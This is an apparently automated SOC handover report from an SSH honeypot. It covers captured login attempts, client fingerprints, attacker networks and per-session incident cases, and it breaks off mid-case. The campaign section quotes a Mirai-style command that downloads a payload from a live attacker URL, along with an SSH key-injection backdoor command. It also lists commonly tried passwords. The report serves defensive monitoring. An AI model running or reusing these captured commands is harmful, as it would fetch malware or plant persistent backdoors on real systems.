# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-17 |
| **Generated At** | 2026-11-17T05:45:56Z |
| **Shift Time** | 05:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **220** |
| Confirmed Threats | **195** |
| False Positives Filtered | **25** (11.4%) |
| Unique Attacker IPs | **133** |
| Countries of Origin | **36** |
| High Severity Cases | **155** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **85** HIGH · **216** MED · 391 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1662** |
| Unique Credential Pairs | **1194** |
| Unique Usernames | **414** |
| Unique Passwords | **799** |
| Successful Auth Pairs | **1558** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 591 |
| `admin` | 81 |
| `ubuntu` | 36 |
| `user` | 30 |
| `support` | 27 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 74 |
| `123` | 45 |
| `1234` | 34 |
| `root` | 33 |
| `admin` | 31 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 22 |
| `rootssssss23424123123` | `rootssssss23424123123` | 19 |
| `support` | `support` | 14 |
| `root` | `root` | 14 |
| `root` | `root3245gs5662d34111111111` | 12 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test55555` | `109.160.32.120` | 2026-11-17T00:00:02 |
| `root` | `741852963` | `109.160.32.134` | 2026-11-17T00:00:04 |
| `root` | `Aa123123` | `109.160.32.120` | 2026-11-17T00:00:08 |
| `root` | `Admin@2026` | `109.160.32.134` | 2026-11-17T00:00:10 |
| `deploy` | `admin` | `109.160.32.134` | 2026-11-17T00:00:15 |
| `root` | `@123456789` | `109.160.32.120` | 2026-11-17T00:00:15 |
| `root` | `root1234` | `109.160.32.134` | 2026-11-17T00:00:19 |
| `deploy` | `toor` | `109.160.32.120` | 2026-11-17T00:00:21 |
| `sftp` | `Abcd1234` | `109.160.32.134` | 2026-11-17T00:00:25 |
| `service` | `nomoreinfo!@` | `109.160.32.120` | 2026-11-17T00:00:26 |
| `root` | `pass` | `109.160.32.134` | 2026-11-17T00:00:30 |
| `ben` | `ben` | `109.160.32.120` | 2026-11-17T00:00:32 |
| `root` | `Aa12345678@` | `109.160.32.134` | 2026-11-17T00:00:35 |
| `root` | `111290` | `109.160.32.120` | 2026-11-17T00:00:38 |
| `admin` | `admin!@` | `109.160.32.134` | 2026-11-17T00:00:40 |
| `guest` | `guest` | `109.160.32.120` | 2026-11-17T00:00:45 |
| `testing` | `Password@123` | `109.160.32.134` | 2026-11-17T00:00:45 |
| `root` | `183729` | `109.160.32.120` | 2026-11-17T00:00:51 |
| `root` | `tyuiop` | `109.160.32.134` | 2026-11-17T00:00:51 |
| `user` | `user1234` | `109.160.32.134` | 2026-11-17T00:00:55 |
_… 1538 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **220** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 75 |
| OpenSSH | 56 |
| libssh | 24 |
| Unknown | 4 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 53 | 53 |
| `2ec37a7cc8da...` | Mirai/variant | 52 | 1 |
| `f555226df196...` | Mirai/variant | 22 | 11 |
| `0a07365cc01f...` | Generic scanner | 4 | 2 |
| `7d01d047ace6...` | Mirai/variant | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 53 | 53 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 52 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 22 | 11 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 4 | 2 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 4 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 3 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **62** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1489` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 10 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
enable
```
```
system
```
```
shell
```
```
busybox sh -c 'for p in mirai sora mozi hajime tsunami gafgyt yakuza owari josho ECCHI; do   killall -9 $p 2>/dev/null; done; for d in /tmp /var/run /dev/shm /var/tmp; do   ls $d 2>/dev/null | while read f; do     [ -x "$d/$f" ] && rm -f "$d/$f" 2>/dev/null;   done; done; cd /tmp || cd /var/run || cd /dev/shm || cd /; wget -q -O su9wyp.sh http://168.220.248.106:9087/payload/a6i3khk75wgf/su9wyp.sh 2>/dev/null || curl -s -o su9wyp.sh http://168.220.248.106:9087/payload/a6i3khk75wgf/su9wyp.sh 2>/dev/null; chmo
```
Source IPs: `128.199.173.169`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.133.61.254`, `186.121.233.2`, `213.230.127.104`, `201.17.133.138`, `36.92.140.209`, `20.184.59.236`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `85.198.19.217`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **133** |
| Unique ASNs | **66** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 42 | HIGH |
| `AS396982` | Google LLC | 8 | LOW |
| `AS22773` | Cox Communications Inc. | 5 | HIGH |
| `AS15169` | Google LLC | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS8452` | TE-AS | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (153)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ab073390cf66

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]120` |
| **First Seen** | 2026-11-17 00:00 |
| **Last Seen** | 2026-11-17 00:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:00:00` | `cowrie.session.connect` |
| `2026-11-17 00:00:00` | `cowrie.client.version` |
| `2026-11-17 00:00:00` | `cowrie.client.kex` |
| `2026-11-17 00:00:02` | `cowrie.login.success` |
| `2026-11-17 00:00:03` | `cowrie.session.params` |
| `2026-11-17 00:00:03` | `cowrie.command.input` |
| `2026-11-17 00:00:03` | `cowrie.log.closed` |
| `2026-11-17 00:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]120` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44d91840ab6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]134` |
| **First Seen** | 2026-11-17 00:00 |
| **Last Seen** | 2026-11-17 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:00:03` | `cowrie.session.connect` |
| `2026-11-17 00:00:03` | `cowrie.client.version` |
| `2026-11-17 00:00:03` | `cowrie.client.kex` |
| `2026-11-17 00:00:04` | `cowrie.login.success` |
| `2026-11-17 00:00:05` | `cowrie.session.params` |
| `2026-11-17 00:00:05` | `cowrie.command.input` |
| `2026-11-17 00:00:05` | `cowrie.log.closed` |
| `2026-11-17 00:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]134` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0013013fd3f1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-17 00:03 |
| **Last Seen** | 2026-11-17 00:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:03:50` | `cowrie.session.connect` |
| `2026-11-17 00:03:50` | `cowrie.client.version` |
| `2026-11-17 00:03:50` | `cowrie.client.kex` |
| `2026-11-17 00:03:50` | `cowrie.login.success` |
| `2026-11-17 00:03:50` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:03:50` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4ffa37a0df

| Field | Detail |
|---|---|
| **Source IP** | `150.187.4[.]193` |
| **First Seen** | 2026-11-17 00:07 |
| **Last Seen** | 2026-11-17 00:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:07:15` | `cowrie.session.connect` |
| `2026-11-17 00:07:15` | `cowrie.client.version` |
| `2026-11-17 00:07:15` | `cowrie.client.kex` |
| `2026-11-17 00:07:17` | `cowrie.login.success` |
| `2026-11-17 00:07:18` | `cowrie.session.params` |
| `2026-11-17 00:07:18` | `cowrie.command.input` |
| `2026-11-17 00:07:18` | `cowrie.command.failed` |
| `2026-11-17 00:07:18` | `cowrie.log.closed` |
| `2026-11-17 00:07:19` | `cowrie.session.params` |
| `2026-11-17 00:07:19` | `cowrie.command.input` |
| `2026-11-17 00:07:19` | `cowrie.session.file_download` |
| `2026-11-17 00:07:19` | `cowrie.log.closed` |
| `2026-11-17 00:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.187.4[.]193` to AbuseIPDB if not already reported
- [ ] Block `150.187.4[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e21666921f

| Field | Detail |
|---|---|
| **Source IP** | `150.187.4[.]193` |
| **First Seen** | 2026-11-17 00:07 |
| **Last Seen** | 2026-11-17 00:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:07:19` | `cowrie.session.connect` |
| `2026-11-17 00:07:19` | `cowrie.client.version` |
| `2026-11-17 00:07:19` | `cowrie.client.kex` |
| `2026-11-17 00:07:19` | `cowrie.login.success` |
| `2026-11-17 00:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.187.4[.]193` to AbuseIPDB if not already reported
- [ ] Block `150.187.4[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8b8f275462

| Field | Detail |
|---|---|
| **Source IP** | `175.213.96[.]102` |
| **First Seen** | 2026-11-17 00:11 |
| **Last Seen** | 2026-11-17 00:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:11:24` | `cowrie.session.connect` |
| `2026-11-17 00:11:25` | `cowrie.client.version` |
| `2026-11-17 00:11:25` | `cowrie.client.kex` |
| `2026-11-17 00:11:29` | `cowrie.login.success` |
| `2026-11-17 00:11:29` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.213.96[.]102` to AbuseIPDB if not already reported
- [ ] Block `175.213.96[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5283e0acd8b5

| Field | Detail |
|---|---|
| **Source IP** | `216.16.60[.]51` |
| **First Seen** | 2026-11-17 00:11 |
| **Last Seen** | 2026-11-17 00:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:11:35` | `cowrie.session.connect` |
| `2026-11-17 00:11:36` | `cowrie.client.version` |
| `2026-11-17 00:11:36` | `cowrie.client.kex` |
| `2026-11-17 00:11:38` | `cowrie.login.success` |
| `2026-11-17 00:11:38` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.16.60[.]51` to AbuseIPDB if not already reported
- [ ] Block `216.16.60[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3109e7e1d8f2

| Field | Detail |
|---|---|
| **Source IP** | `45.14.225[.]216` |
| **First Seen** | 2026-11-17 00:15 |
| **Last Seen** | 2026-11-17 00:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `perl -v` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:15:22` | `cowrie.session.connect` |
| `2026-11-17 00:15:22` | `cowrie.client.version` |
| `2026-11-17 00:15:22` | `cowrie.client.kex` |
| `2026-11-17 00:15:22` | `cowrie.login.success` |
| `2026-11-17 00:15:23` | `cowrie.session.params` |
| `2026-11-17 00:15:23` | `cowrie.command.input` |
| `2026-11-17 00:15:23` | `cowrie.log.closed` |
| `2026-11-17 00:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.14.225[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.14.225[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e829794a1f2f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-17 00:18 |
| **Last Seen** | 2026-11-17 00:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:18:26` | `cowrie.session.connect` |
| `2026-11-17 00:18:27` | `cowrie.login.success` |
| `2026-11-17 00:18:27` | `cowrie.session.params` |
| `2026-11-17 00:18:28` | `cowrie.log.closed` |
| `2026-11-17 00:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff50e3690f3

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]160` |
| **First Seen** | 2026-11-17 00:20 |
| **Last Seen** | 2026-11-17 00:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:20:46` | `cowrie.session.connect` |
| `2026-11-17 00:20:46` | `cowrie.client.version` |
| `2026-11-17 00:20:46` | `cowrie.client.kex` |
| `2026-11-17 00:20:46` | `cowrie.login.success` |
| `2026-11-17 00:20:47` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:20:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-11-17 00:20:47` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]160` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ff982dea31

| Field | Detail |
|---|---|
| **Source IP** | `121.131.220[.]156` |
| **First Seen** | 2026-11-17 00:36 |
| **Last Seen** | 2026-11-17 00:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:36:41` | `cowrie.session.connect` |
| `2026-11-17 00:36:42` | `cowrie.client.version` |
| `2026-11-17 00:36:42` | `cowrie.client.kex` |
| `2026-11-17 00:36:45` | `cowrie.login.success` |
| `2026-11-17 00:36:46` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.131.220[.]156` to AbuseIPDB if not already reported
- [ ] Block `121.131.220[.]156` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5253564f5127

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-11-17 00:36 |
| **Last Seen** | 2026-11-17 00:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:36:52` | `cowrie.session.connect` |
| `2026-11-17 00:36:53` | `cowrie.client.version` |
| `2026-11-17 00:36:53` | `cowrie.client.kex` |
| `2026-11-17 00:36:55` | `cowrie.login.success` |
| `2026-11-17 00:36:56` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c49a637eb2c

| Field | Detail |
|---|---|
| **Source IP** | `68.225.62[.]218` |
| **First Seen** | 2026-11-17 00:48 |
| **Last Seen** | 2026-11-17 00:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:48:41` | `cowrie.session.connect` |
| `2026-11-17 00:48:42` | `cowrie.client.version` |
| `2026-11-17 00:48:42` | `cowrie.client.kex` |
| `2026-11-17 00:48:44` | `cowrie.login.success` |
| `2026-11-17 00:48:44` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.225.62[.]218` to AbuseIPDB if not already reported
- [ ] Block `68.225.62[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff7dee1a804

| Field | Detail |
|---|---|
| **Source IP** | `49.206.27[.]37` |
| **First Seen** | 2026-11-17 00:48 |
| **Last Seen** | 2026-11-17 00:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:48:50` | `cowrie.session.connect` |
| `2026-11-17 00:48:51` | `cowrie.client.version` |
| `2026-11-17 00:48:51` | `cowrie.client.kex` |
| `2026-11-17 00:48:53` | `cowrie.login.success` |
| `2026-11-17 00:48:55` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `49.206.27[.]37` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314f690bd2a2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-17 00:53 |
| **Last Seen** | 2026-11-17 00:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:53:45` | `cowrie.session.connect` |
| `2026-11-17 00:53:46` | `cowrie.login.success` |
| `2026-11-17 00:53:46` | `cowrie.session.params` |
| `2026-11-17 00:53:46` | `cowrie.log.closed` |
| `2026-11-17 00:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc3e6869f3d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.17[.]214` |
| **First Seen** | 2026-11-17 00:55 |
| **Last Seen** | 2026-11-17 00:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:55:16` | `cowrie.session.connect` |
| `2026-11-17 00:55:17` | `cowrie.client.version` |
| `2026-11-17 00:55:17` | `cowrie.client.kex` |
| `2026-11-17 00:55:20` | `cowrie.login.success` |
| `2026-11-17 00:55:21` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.17[.]214` to AbuseIPDB if not already reported
- [ ] Block `111.70.17[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f31287ace3c9

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-17 00:55 |
| **Last Seen** | 2026-11-17 00:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:55:23` | `cowrie.session.connect` |
| `2026-11-17 00:55:23` | `cowrie.client.version` |
| `2026-11-17 00:55:23` | `cowrie.client.kex` |
| `2026-11-17 00:55:23` | `cowrie.login.success` |
| `2026-11-17 00:55:24` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:55:24` | `cowrie.direct-tcpip.ja4` |
| `2026-11-17 00:55:24` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
